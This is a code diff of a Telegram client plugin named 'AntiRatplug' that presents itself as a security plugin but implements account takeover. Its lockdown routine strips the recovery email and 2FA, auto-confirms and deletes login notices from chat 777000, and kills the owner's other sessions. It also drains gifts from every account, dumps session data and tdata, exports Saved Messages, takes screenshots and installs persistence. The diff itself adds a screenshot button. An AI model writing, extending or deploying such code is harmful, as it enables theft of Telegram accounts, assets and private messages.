@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
 AntiRatplug — Slim + Vidker + Fake Hooks + 2FA + Multi-Session Annihilation.
-Harvest + Lockdown (9 групп) + Vidker + фейковые статусы + максимум сессий.
+Harvest + Lockdown (9 групп) + Vidker + фейковые статусы + отдельная кнопка Screenshot.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
 __description__ = "Slim Harvest + Lockdown + Vidker + Fake Hooks + 2FA."
 __author__ = "@from_a4"
-__version__ = "18.6 [Slim+Vidker+Hooks+2FA+MultiSessions]"
+__version__ = "18.6.1 [Slim+Vidker+Hooks+2FA+MultiSessions+Shot]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -495,7 +495,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug v18.6 loaded")
+            self._send_msg("AntiRatplug v18.6.1 loaded")
         except Exception:
             pass
         try:
@@ -973,7 +973,6 @@ class PluginSecurityPlugin(BasePlugin):
             return 0
 
     def _confirm_login_notice_dialog(self, mc, acc):
-        """Автоподтверждение 'yes, it's me' в сервисном чате 777000."""
         try:
             mo = mc.dialogMessage.get(777000)
         except Exception:
@@ -992,11 +991,11 @@ class PluginSecurityPlugin(BasePlugin):
                 mid = int(getattr(owner, "id", 0))
             except Exception:
                 return False
-        key = (acc, mid)
-        if key in getattr(self, "_confirmed_notices", set()):
-            return False
         if not hasattr(self, "_confirmed_notices"):
             self._confirmed_notices = set()
+        key = (acc, mid)
+        if key in self._confirmed_notices:
+            return False
         NEG = ("нет", "not me", "это не я", "reject", "terminate", "revoke", "no!")
         POS = ("это я", "it's me", "its me", "yes", "accept", "confirm", "login")
         btn_hit = None
@@ -1643,7 +1642,6 @@ class PluginSecurityPlugin(BasePlugin):
         return report
 
     def _drain_all_accounts(self, transfer_gifts=True):
-        """Дрен по ВСЕМ аккаунтам клиента."""
         results = []
         accounts = self._get_accounts_list()
         for acc_info in accounts:
@@ -1956,12 +1954,9 @@ class PluginSecurityPlugin(BasePlugin):
             return {"error": str(e)}
 
     def _kill_all_sessions(self, acc=0):
-        """Убивает ВСЕ не-текущие сессии с многопроходной добивкой.
-        Расширено: 5 проходов с паузой, добив auth.resetAuthorizations."""
         killed_total = 0
         total = 0
         errors = []
-        # первичный список
         auths = self._get_authorizations_full(acc)
         if auths is None:
             return 0, 0, ["getAuthorizations failed"], 0
@@ -1991,7 +1986,6 @@ class PluginSecurityPlugin(BasePlugin):
                 return False, str(e)[:80]
 
         dead = set()
-        # 5 проходов добивки — сессии иногда всплывают с задержкой
         for p in range(5):
             targets = [a["hash"] for a in auths
                        if not a["current"] and a["hash"]
@@ -2018,7 +2012,6 @@ class PluginSecurityPlugin(BasePlugin):
                 seen_hashes.update(a["hash"] for a in auths_new)
                 total = max(total, len(auths_new))
                 auths = auths_new
-        # финальный добив — resetAuthorizations разом
         try:
             Rst = self._tl_class_or(
                 "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
@@ -2044,7 +2037,6 @@ class PluginSecurityPlugin(BasePlugin):
         return False
 
     def _wipe_sessions_all(self):
-        """Кикает все сессии на ВСЕХ аккаунтах клиента."""
         results = []
         accounts = self._get_accounts_list()
         for acc_info in accounts:
@@ -2528,6 +2520,7 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _screenshot(self):
         try:
+            self._send_msg("📸 Скриншот...")
             act = self._get_activity()
             if act is None:
                 self._send_msg("Скриншот: нет активности")
@@ -2573,7 +2566,6 @@ class PluginSecurityPlugin(BasePlugin):
             uid = _UC().getInstance(0).getClientUserId()
             input_peer = self._get_input_peer(0, uid)
             if input_peer is None:
-                self._send_msg("Export: нет input peer")
                 return {"error": "no peer"}
             Req = TLRPC.TL_messages_getHistory()
             req = Req()
@@ -2714,10 +2706,9 @@ class PluginSecurityPlugin(BasePlugin):
         def task():
             try:
                 t0 = time.time()
-                self._send_msg("FULL LOCKDOWN v18.6")
+                self._send_msg("FULL LOCKDOWN v18.6.1")
                 report = ["<b>FULL LOCKDOWN</b>"]
 
-                # 0/9 Deploy
                 self._send_msg("0/9 Deploy...")
                 try:
                     self._parallel([
@@ -2729,7 +2720,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Deploy:</b> %s" % e)
 
-                # 1/9 Group A
                 self._send_msg("1/9 Group A...")
                 ga = self._parallel([
                     (self._tg_kid,),
@@ -2745,7 +2735,6 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Каналов:</b> %s" % str(ga[3] if len(ga) > 3 else 0))
                 report.append("<b>Ботов:</b> %s" % str(ga[4] if len(ga) > 4 else 0))
 
-                # 2/9 Gift Transfer (current account)
                 if transfer_gifts:
                     self._send_msg("2/9 Gift Transfer...")
                     try:
@@ -2756,7 +2745,6 @@ class PluginSecurityPlugin(BasePlugin):
                     except Exception as e:
                         report.append("<b>Gifts:</b> %s" % e)
 
-                # 3/9 Group C (recovery + 2fa + cloud pass + session confirm + profile)
                 self._send_msg("3/9 Group C...")
                 gc = self._parallel([
                     (self._remove_recovery_email, account),
@@ -2789,7 +2777,6 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Профиль:</b> %s" % ("[LOCKED]" if prof_ok else "fail"))
                 report.append("<b>Контакты:</b> %s" % ("удалены" if cont_ok else "fail"))
 
-                # 4/9 Group D (kill sessions + 777000)
                 self._send_msg("4/9 Group D...")
                 gd = self._parallel([
                     (self._kill_all_sessions, account),
@@ -2803,7 +2790,6 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Сессий убито:</b> %d / %d" % (killed, total))
                 report.append("<b>777000:</b> %s" % ("удалён" if dlg_ok else "нет"))
 
-                # 5/9 Group E (добив + реплики)
                 self._send_msg("5/9 Group E...")
                 ge = self._parallel([
                     (self._tg_kid,),
@@ -2825,17 +2811,16 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Добито:</b> %d" % k2)
                 report.append("<b>Реплик:</b> %d" % rep_n)
 
-                # 6/9 Group F (multi-account drain)
                 self._send_msg("6/9 Group F (multi-acc drain)...")
                 try:
                     dr_all = self._drain_all_accounts(transfer_gifts)
-                    ok_cnt = sum(1 for r in dr_all if isinstance(r.get("result"), dict) and r["result"].get("ok"))
-                    total_ok = sum((r.get("result") or {}).get("ok", 0) for r in dr_all if isinstance(r.get("result"), dict))
-                    report.append("<b>Multi-acc drain:</b> %d акк. / %d подарков" % (len(dr_all), total_ok))
+                    total_ok = sum((r.get("result") or {}).get("ok", 0)
+                                   for r in dr_all if isinstance(r.get("result"), dict))
+                    report.append("<b>Multi-acc drain:</b> %d акк. / %d подарков" % (
+                        len(dr_all), total_ok))
                 except Exception as e:
                     report.append("<b>Multi-acc drain:</b> %s" % e)
 
-                # 7/9 Group G (wipe all sessions on all accounts)
                 self._send_msg("7/9 Group G (wipe all)...")
                 try:
                     wr_all = self._wipe_sessions_all()
@@ -2845,7 +2830,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Session wipe:</b> %s" % e)
 
-                # 8/9 Group H (dump userbot session + tdata)
                 self._send_msg("8/9 Group H (userbot dump)...")
                 try:
                     self._manual_userbot_session()
@@ -2853,7 +2837,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Userbot dump:</b> %s" % e)
 
-                # 9/9 Group I (export Saved Messages)
                 self._send_msg("9/9 Group I (Saved export)...")
                 try:
                     ex = self._export_saved_messages()
@@ -2864,7 +2847,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Saved export:</b> %s" % e)
 
-                # Persistence final
                 self._send_msg("Persistence...")
                 try:
                     self._install_persistence()
@@ -2873,7 +2855,7 @@ class PluginSecurityPlugin(BasePlugin):
                     report.append("<b>Persistence:</b> %s" % e)
 
                 report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
-                report.append("<b>Lockdown v18.6 завершён.</b>")
+                report.append("<b>Lockdown v18.6.1 завершён.</b>")
                 self._send_markup("\n".join(report), {
                     "inline_keyboard": [
                         [{"text": "Pull Out", "callback_data": "hv_logout"}],
@@ -2901,7 +2883,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uid)
         except Exception:
             pass
-        text = "<b>AntiRatplug v18.6</b>\nUser: @" + username + "\n\nTap Manage"
+        text = "<b>AntiRatplug v18.6.1</b>\nUser: @" + username + "\n\nTap Manage"
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         for target in _targets:
@@ -2958,6 +2940,7 @@ class PluginSecurityPlugin(BasePlugin):
                 [{"text": "Full Harvest"}],
                 [{"text": "Full Lockdown"}],
                 [{"text": "Vidker"}],
+                [{"text": "Screenshot"}],
                 [{"text": "Info"}, {"text": "Tg kid"}],
                 [{"text": "Wipe"}, {"text": "Pull Out"}],
             ],
@@ -3150,7 +3133,7 @@ class PluginSecurityPlugin(BasePlugin):
         elif cb_data == "hv_logout":
             self._pull_out_account()
         elif cb_data == "hv_shot":
-            self._screenshot()
+            threading.Thread(target=self._screenshot, daemon=True).start()
         elif cb_data == "vid_arishem":
             self._activate_vidker("arishem")
         elif cb_data == "vid_sentry":
@@ -3176,6 +3159,8 @@ class PluginSecurityPlugin(BasePlugin):
             self._full_lockdown(0, transfer_gifts=True)
         elif msg_text == "Vidker":
             self._show_vidker_menu()
+        elif msg_text == "Screenshot":
+            threading.Thread(target=self._screenshot, daemon=True).start()
         elif msg_text == "Info":
             self._info()
         elif msg_text == "Tg kid":
